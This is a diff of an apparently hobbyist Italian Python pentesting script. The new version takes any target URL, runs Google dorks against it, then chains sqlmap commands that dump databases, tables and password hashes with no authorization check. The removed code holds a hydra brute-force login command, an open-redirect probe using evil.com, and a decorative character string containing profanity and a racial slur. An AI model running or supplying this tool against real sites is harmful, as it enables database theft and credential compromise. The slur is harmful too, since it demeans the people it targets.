@@ -1,161 +1,95 @@
 import os
 import subprocess
 import requests
-import re
-import time
 from bs4 import BeautifulSoup
-import random
-import sys
-import sqlite3
+import re
 
-# Pulizia schermo (utile durante esecuzioni lunghe)
-def pulisci_schermo():
-    os.system('cls' if os.name == 'nt' else 'clear')
+def formatta_numero_telefono(numero_telefono):
+    """Formatta il numero di telefono con le parentesi quadre."""
+    return f"[{numero_telefono}]"
 
-# Effetto Matrix per estetica del terminale
-def display_matrix_effect(duration=5):
-    columns = 80  
-    rows = 24     
-    chars = "ercazoercazzoercazzoerc4azzoercazzo3rc4zzoercazzonesucanegrodimerda1233909"
-    
-    end_time = time.time() + duration
-    while time.time() < end_time:
-        grid = [[' ' for _ in range(columns)] for _ in range(rows)]
-        for y in range(rows):
-            for x in range(columns):
-                if random.random() < 0.1:
-                    grid[y][x] = random.choice(chars)
+def run_command(command):
+    """Esegui un comando e restituisci l'output."""
+    result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+    return result.stdout, result.stderr
 
-        for row in grid:
-            print('\033[92m' + ''.join(row) + '\033[0m')  # Stile Matrix verde
-        sys.stdout.flush()
-        time.sleep(0.1)
-        pulisci_schermo()
+def run_sudo_command(command):
+    """Esegui un comando con sudo e restituisci l'output."""
+    result = subprocess.run(['sudo'] + command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+    return result.stdout, result.stderr
 
-# Avviare Tor (se necessario per anonimato)
-def start_tor():
-    print("Tor in avvio...")
-    try:
-        subprocess.Popen(['tor'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        time.sleep(10)  
-        print("Tor avviato correttamente.")
-    except Exception as e:
-        print(f"Errore durante l'avvio di Tor: {e}")
+def print_griglia_risultati(titolo, risultati):
+    """Stampa i risultati in una griglia tratteggiata con un titolo."""
+    print(f"\n{'-' * 40}\n{titolo}\n{'-' * 40}")
+    for risultato in risultati:
+        print(risultato)
 
-# Funzione per installare tool di pentesting necessari
-def install_tool(tool_name, install_command):
-    try:
-        subprocess.run([tool_name, '--version'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        print(f"{tool_name} è già installato.")
-        return True
-    except FileNotFoundError:
-        print(f"{tool_name} non trovato. Installazione in corso...")
+def esegui_dorks(target_url, dorks):
+    """Esegui le Google Dorks su un sito target."""
+    print(f"Esecuzione di Google Dorks su {target_url}...\n")
+    for dork in dorks:
+        url_dork = f"https://www.google.com/search?q={dork}+site:{target_url}"
         try:
-            subprocess.run(install_command, shell=True, check=True)
-            print(f"{tool_name} installato correttamente.")
-            return True
-        except subprocess.CalledProcessError as e:
-            print(f"Errore durante l'installazione di {tool_name}: {e}")
-            return False
+            response = requests.get(url_dork)
+            if response.status_code == 200:
+                soup = BeautifulSoup(response.text, 'html.parser')
+                links = [a['href'] for a in soup.find_all('a', href=True)]
+                print_griglia_risultati(f"Risultati per Dork: {dork}", links)
+            else:
+                print(f"Errore nella ricerca con Dork {dork}. Status code: {response.status_code}")
+        except Exception as e:
+            print(f"Errore durante la ricerca con Dork {dork}: {e}")
 
-# Installa strumenti principali per scansioni
-def install_required_tools():
-    install_tool('hydra', 'sudo apt-get install -y hydra')
-    install_tool('git', 'sudo apt-get install -y git')
-    install_tool('nmap', 'sudo apt-get install -y nmap')
-    install_tool('nikto', 'sudo apt-get install -y nikto')
-    install_tool('sqlmap', 'sudo apt-get install -y sqlmap')
+def carica_dorks(file_path):
+    """Carica le Dorks da un file di testo."""
+    with open(file_path, 'r') as file:
+        return [line.strip() for line in file.readlines()]
 
-    if not os.path.exists('HostHunter'):
-        print("Clonazione di HostHunter da GitHub...")
+def perform_sqlmap_scan(target_url):
+    """Esegui uno scan SQLmap sul target URL."""
+    print("\nEsecuzione scansione SQLmap...\n")
+    comandi = [
+        ["sqlmap", "-u", target_url, "--batch", "--risk=3", "--level=5", "--dbs"],
+        ["sqlmap", "-u", target_url, "--tables"],
+        ["sqlmap", "-u", target_url, "--columns"],
+        ["sqlmap", "-u", target_url, "--dump"],
+        ["sqlmap", "-u", target_url, "--passwords"]
+    ]
+    for comando in comandi:
         try:
-            subprocess.run('git clone https://github.com/SpiderLabs/HostHunter.git', shell=True, check=True)
-            print("HostHunter installato correttamente.")
-        except subprocess.CalledProcessError as e:
-            print(f"Errore durante la clonazione di HostHunter: {e}")
-    else:
-        print("HostHunter è già presente.")
+            stdout, stderr = run_command(comando)
+            print_griglia_risultati(f"Risultati SQLmap per {comando}", [stdout])
+        except Exception as e:
+            print(f"Errore durante la scansione SQLmap: {e}")
 
-# Funzione per effettuare scanning su vulnerabilità comuni
-def scan_vulnerabilities(url):
+def check_website_status(url):
+    """Controlla se il sito web è accessibile."""
     try:
-        print(f"\nInizio scansione delle vulnerabilità per {url}...")
-
-        # Scan XSS con regex di base (comando esterno potrebbe essere aggiunto)
         response = requests.get(url)
-        soup = BeautifulSoup(response.text, 'html.parser')
-        scripts = soup.find_all('script')
+        if response.status_code == 200:
+            print(f"Sito {url} accessibile.")
+            return True
+        else:
+            print(f"Sito {url} non accessibile. Status code: {response.status_code}")
+            return False
+    except requests.RequestException as e:
+        print(f"Errore: {e}")
+        return False
 
-        if scripts:
-            print(f"\nPossibili punti di XSS rilevati nel sito: {url}")
-            for script in scripts:
-                print(script)
+def main():
+    """Funzione principale per eseguire le scansioni."""
+    target_url = input("Inserisci l'URL del sito target: ")
 
-        # Scansione SQL Injection con SQLMap (necessita di autorizzazione)
-        print("\nEsecuzione SQLMap (SQL Injection Check)...")
-        sqlmap_command = f"sqlmap -u {url} --batch"
-        subprocess.run(sqlmap_command, shell=True)
-
-        # Open Redirect Check
-        check_open_redirect(url)
-
-        print("Scansione completata.")
-
-    except Exception as e:
-        print(f"Errore durante la scansione delle vulnerabilità: {e}")
-
-# Funzione per rilevare Honeypot analizzando le risposte e configurazioni sospette
-def honeypot_detection(url):
-    try:
-        print(f"\nInizio rilevamento honeypot per {url}...")
-        headers = {"User-Agent": "Mozilla/5.0"}
-        response = requests.get(url, headers=headers)
+    # Controllo se il sito è accessibile
+    if check_website_status(target_url):
+        # Caricamento delle Dorks
+        dorks_file = '/mnt/data/Dork.txt'
+        dorks = carica_dorks(dorks_file)
         
-        # Segnali comuni di honeypot
-        if "X-HoneyPot" in response.headers:
-            print(f"\nHoneypot rilevato: {url}")
-        elif response.status_code == 418:  # Codice HTTP I'm a teapot spesso usato per honeypot
-            print(f"\nPossibile Honeypot (HTTP 418) rilevato su {url}")
-        else:
-            print("\nNessun honeypot rilevato.")
-    
-    except Exception as e:
-        print(f"Errore durante il rilevamento di honeypot: {e}")
+        esegui_dorks(target_url, dorks)
+        perform_sqlmap_scan(target_url)
+    else:
+        print("Il sito web non è accessibile. Uscita...")
 
-# Controllo Open Redirect
-def check_open_redirect(url):
-    try:
-        print(f"\nControllo Open Redirect per {url}...")
-        redirect_test = f"{url}?next=https://evil.com"
-        response = requests.get(redirect_test, allow_redirects=False)
-        if response.status_code == 302 and "evil.com" in response.headers.get('Location', ''):
-            print(f"Vulnerabilità Open Redirect trovata su {url}")
-        else:
-            print("Nessun Open Redirect trovato.")
-    except Exception as e:
-        print(f"Errore durante il controllo Open Redirect: {e}")
-
-# Cheatsheet per comandi utili durante il pentesting
-def show_ctf_cheatsheet():
-    cheatsheet = """
-    Comandi utili per CTF e Pentesting:
-    
-    1. SQL Injection: sqlmap -u <url> --dbs
-    2. XSS: Usa payload comuni di XSS per testare form.
-    3. Brute Force Login: hydra -l admin -P passwords.txt <url> http-post-form "/login.php:username=^USER^&password=^PASS^:F=failed"
-    4. Scansione Nmap: nmap -sC -sV -oA output <url>
-    5. Nikto Scan: nikto -h <url>
-    """
-    print(cheatsheet)
-
-# Funzione principale per eseguire scansioni e rilevamenti
 if __name__ == "__main__":
-    pulisci_schermo()
-    display_matrix_effect()
-    install_required_tools()
-    
-    # Esegui scansioni su un URL di test
-    target_url = "http://example.com"
-    scan_vulnerabilities(target_url)
-    honeypot_detection(target_url)
-    show_ctf_cheatsheet()
+    main()
